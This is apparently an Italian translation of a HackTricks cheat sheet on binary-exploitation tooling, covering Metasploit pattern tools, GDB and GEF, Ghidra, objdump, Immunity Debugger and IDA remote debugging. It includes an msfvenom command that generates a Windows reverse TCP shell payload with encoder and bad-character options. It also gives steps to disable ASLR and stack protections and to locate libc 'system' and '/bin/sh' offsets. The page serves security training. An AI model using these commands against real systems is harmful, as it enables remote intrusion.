<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## Shellcodes

Un shellcode √® un frammento di codice binario che viene utilizzato come payload in un attacco informatico. Questo codice viene eseguito da un exploit per sfruttare una vulnerabilit√† nel software di destinazione. 

I shellcode sono scritti in linguaggio macchina e sono progettati per essere eseguiti direttamente dal processore. Sono solitamente molto compatti e ottimizzati per occupare meno spazio possibile. 

I shellcode possono essere utilizzati per vari scopi, come ottenere l'accesso remoto a un sistema, eseguire comandi arbitrari, scaricare e installare malware, o sfruttare altre vulnerabilit√† nel sistema. 

Per creare un shellcode, √® necessario conoscere l'architettura del sistema di destinazione e la vulnerabilit√† specifica che si intende sfruttare. Esistono diversi strumenti e framework disponibili per la generazione di shellcode, come Metasploit Framework e msfvenom. 

√à importante notare che l'utilizzo di shellcode per scopi illegali √® un reato e pu√≤ comportare conseguenze legali gravi. L'utilizzo di shellcode dovrebbe essere limitato solo a scopi di ricerca e test di sicurezza autorizzati.
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## Installazione

Per installare GDB, segui i seguenti passaggi:

1. Apri il terminale.
2. Esegui il comando `sudo apt-get install gdb` per installare GDB utilizzando il package manager apt-get.
3. Inserisci la password di amministratore quando richiesto.
4. Attendi il completamento dell'installazione.

Una volta completata l'installazione, puoi verificare se GDB √® stato installato correttamente eseguendo il comando `gdb --version`.
```
apt-get install gdb
```
## Parametri

**-q** --> Non mostrare il banner\
**-x \<file>** --> Esegui automaticamente le istruzioni GDB da qui\
**-p \<pid>** --> Collegati al processo

### Istruzioni

\> **disassemble main** --> Disassembla la funzione\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> Segui il processo creato\
\> **p system** --> Trova l'indirizzo della funzione system\
\> **help**\
\> **quit**

\> **br func**  --> Aggiungi un punto di interruzione alla funzione\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> Elimina quel numero di punti di interruzione\
\> **watch ESPRESSIONE** --> Interrompi se il valore cambia

**> run** --> Esegui\
**> start** --> Avvia e interrompi in main\
\> **n/next** --> Esegui l'istruzione successiva (non all'interno)\
\> **s/step** --> Esegui l'istruzione successiva\
\> **c/continue** --> Continua fino al prossimo punto di interruzione

\> **set $eip = 0x12345678** --> Cambia il valore di $eip\
\> **info functions** --> Informazioni sulle funzioni\
\> **info functions func** --> Informazioni sulla funzione\
\> **info registers** --> Valore dei registri\
\> **bt** --> Stack\
\> **bt full** --> Stack dettagliato

\> **print variabile**\
\> **print 0x87654321 - 0x12345678** --> Calcola\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> Mostra il contenuto in ottale/esadecimale/decimale/binario/istruzione/ASCII

* **x/o 0xDir\_hex**
* **x/2x $eip** --> 2 parole da EIP
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8 byte (b-> byte, h-> 2 byte, w-> 4 byte, g-> 8 byte)
* **i r eip** --> Valore di $eip
* **x/w pointer** --> Valore del puntatore
* **x/s pointer** --> Stringa puntata dal puntatore
* **x/xw \&pointer** --> Indirizzo in cui si trova il puntatore
* **x/i $eip** ‚Äî> Istruzioni di EIP

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef‚û§  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef‚û§  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## Trucchi

### GDB stessi indirizzi

Durante il debug, GDB avr√† **indirizzi leggermente diversi rispetto a quelli utilizzati dal binario in esecuzione**. Puoi far s√¨ che GDB abbia gli stessi indirizzi facendo quanto segue:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<percorso>` _Inserisci il percorso assoluto del binario_
* Sfrutta il binario utilizzando lo stesso percorso assoluto
* `PWD` e `OLDPWD` devono essere gli stessi quando si utilizza GDB e quando si sfrutta il binario

### Backtrace per trovare le funzioni chiamate

Quando hai un binario **collegato staticamente**, tutte le funzioni apparterranno al binario (e non a librerie esterne). In questo caso sar√† difficile **identificare il flusso che il binario segue per chiedere ad esempio l'input dell'utente**.\
Puoi facilmente identificare questo flusso **eseguendo** il binario con **gdb** fino a quando ti viene richiesto l'input. Quindi, interrompilo con **CTRL+C** e usa il comando **`bt`** (**backtrace**) per vedere le funzioni chiamate:
```
gef‚û§  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## Server GDB

`gdbserver --multi 0.0.0.0:23947` (in IDA devi inserire il percorso assoluto dell'eseguibile nella macchina Linux e nella macchina Windows)

# Ghidra

## Trova l'offset dello stack

**Ghidra** √® molto utile per trovare l'**offset** per un **buffer overflow grazie alle informazioni sulla posizione delle variabili locali.**\
Ad esempio, nell'esempio sottostante, un buffer overflow in `local_bc` indica che √® necessario un offset di `0xbc`. Inoltre, se `local_10` √® un canary cookie, indica che per sovrascriverlo da `local_bc` c'√® un offset di `0xac`.\
_Ricorda che il primo 0x08 da dove viene salvato il RIP appartiene al RBP._

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Compila senza protezioni\
**-o** --> Output\
**-g** --> Salva il codice (GDB sar√† in grado di vederlo)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Per disattivare l'ASLR in Linux

**Per compilare uno shellcode:**\
**nasm -f elf assembly.asm** --> restituisce un ".o"\
**ld assembly.o -o shellcodeout** --> Eseguibile

# Objdump

**-d** --> Scompatta le sezioni eseguibili (vedi opcode di uno shellcode compilato, trova ROP Gadgets, trova l'indirizzo di una funzione...)\
**-Mintel** --> Sintassi **Intel**\
**-t** --> Tabella dei **simboli**\
**-D** --> Scompatta tutto (indirizzo di una variabile statica)\
**-s -j .dtors** --> sezione dtors\
**-s -j .got** --> sezione got\
\-D -s -j .plt --> sezione **plt** **decompilata**\
**-TR** --> **Relocations**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Indirizzo di "puts" da modificare in GOT\
**objdump -D ./exec | grep "VAR\_NAME"** --> Indirizzo di una variabile statica (queste sono memorizzate nella sezione DATA).

# Core dumps

1. Esegui `ulimit -c unlimited` prima di avviare il mio programma
2. Esegui `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=\<path/core> --quiet

# Altro

**ldd executable | grep libc.so.6** --> Indirizzo (se ASLR, questo cambia ogni volta)\
**for i in \`seq 0 20\`; do ldd \<Esecuzione> | grep libc; done** --> Loop per vedere se l'indirizzo cambia molto\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Offset di "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Offset di "/bin/sh"

**strace executable** --> Funzioni chiamate dall'eseguibile\
**rabin2 -i ejecutable -->** Indirizzo di tutte le funzioni

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## Debugging in remoto su Linux

All'interno della cartella IDA puoi trovare i binari che possono essere utilizzati per il debug di un eseguibile su Linux. Per farlo, sposta il binario _linux\_server_ o _linux\_server64_ all'interno del server Linux e avvialo all'interno della cartella che contiene il binario:
```
./linux_server64 -Ppass
```
Successivamente, configura il debugger: Debugger (remoto linux) --> Opzioni del processo...:

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, consulta i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
